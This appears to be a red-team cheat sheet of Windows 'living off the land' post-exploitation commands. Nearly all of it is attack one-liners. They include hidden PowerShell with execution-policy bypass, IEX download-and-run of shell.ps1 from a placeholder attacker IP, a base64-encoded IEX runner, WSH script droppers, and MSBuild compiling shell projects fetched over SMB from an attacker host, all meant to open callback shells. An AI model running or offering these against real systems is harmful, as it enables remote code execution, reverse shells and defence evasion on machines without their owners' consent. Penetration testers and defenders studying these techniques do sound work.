# Living  off the Land

Search Tag(s): #post-exploitation #enumeration-and-discovery #living-off-the-land #windows

## 01 - Command Prompt

### 1.1 - Callback Shell

#### 1.1.1 - Execute Powershell Commands

- System32 is for 32-bit powershell payloads

```
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ex bypass -f file.ps1

C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ep bypass -f file.ps1

C:\Windows\system32\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -ep bypass -c "IEX(New-Object Net.Webclient).DownloadString('http://<IP>/shell.ps1')"
```

- SysWOW64 is for 64-bit powershell payloads

```
C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -f shell.ps1

C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ep bypass -f shell.ps1

C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -ep bypass -c "IEX(New-Object Net.Webclient).DownloadString('http://<IP>/shell.ps1')"
```

#### 1.1.2 - WSH scripts droppers

When deploying reverse shells as droppers or toolings with the following formats.

```
C:\> wscript.exe <script.js | script.vbs>

C:\> cscript.exe <script.js | script.vbs | script.cs>
```

#### 1.1.3 - Compiled After Delivery

##### 1.1.3.1 - MSBuild

Callback shells.

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe shell.csproj

C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\shell.csproj

C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\shell.xml

C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe shell.xml
```

## 02 - Powershell

### 2.1 - Basics

```
PS C:\> Get-Command <command>

PS C:\> Get-Command -Module <powershell_module>
```

### 2.2 - Base64

#### 2.2.1 - Callback Shell Connection

Execute a callback shell.

```
PS C:\> IEX ([System.Text.Encoding]::Unicode.GetString(([convert]::FromBase64String('<base64_encoded>'))))

PS C:\> IEX (iwr -UseBasicParsing http://<IP>/shell.ps1);
```

---
## References

- [[Tactics && Techniques && Procedures (TTPs) Phases/F - Post Exploitation/Shell Is The Beginning/02 - Enumeration and Discovery/Windows/Host/Processes AND Services AND Software/Discover Programs/Manual/Living off the Land|Living off the Land: Discover Programs]]

- [[Web Delivery|Metasploit Web Drive-by]]

- [[Tactics && Techniques && Procedures (TTPs) Phases/F - Post Exploitation/Shell Is The Beginning/07 - File Transfer and Data Exfiltration/Linux/Network Protocols/SMB|Linux Samba Server]]

- [[Tactics && Techniques && Procedures (TTPs) Phases/F - Post Exploitation/Shell Is The Beginning/07 - File Transfer and Data Exfiltration/Windows/Network Protocols/SMB|SMB]]

- [[WebDAV]]

- [[4shared]]

- [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/03 - Defense Evasion/03 - Applocker/C2 Frameworks/Metasploit|Applocker Defense Evasion: Metasploit]]

- [ss64.com Powershell](https://ss64.com/ps/powershell.html)

- [Hacktricks: Shells - Windows](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows)

- [Hacking Articles: Windows Exploitation MSBuild](https://www.hackingarticles.in/windows-exploitation-msbuild/)

- [Red Team Notes: Using MSBuild to Execute Shellcode in C#](https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c)